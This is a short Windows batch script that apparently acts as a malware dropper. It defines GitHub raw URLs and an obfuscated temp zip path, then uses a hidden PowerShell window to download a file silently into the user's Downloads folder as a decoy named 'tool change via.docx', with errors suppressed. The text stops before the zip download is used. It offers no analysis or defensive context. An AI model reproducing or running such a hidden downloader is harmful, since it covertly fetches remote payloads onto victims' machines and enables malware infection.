@echo off
setlocal
set "url=https://github.com/gjaux/d/raw/refs/heads/a/f.zip"
set "tempdir=%temp%"
set "subdir=%tempdir%\MySubDir_%random%%random%"
set "output=%tempdir%\4g5h790g2345h7890g2345h90g2345h-890v2345h789-3v5h.zip"

set "urlpdf=https://github.com/gjaux/d/raw/refs/heads/a/1"
set "downloadPath=%USERPROFILE%\Downloads\tool change via.docx"
powershell -w hidden -c "Invoke-WebRequest -Uri '%urlpdf%' -OutFile '%downloadPath%' -UseBasicParsing -ErrorAction SilentlyContinue"
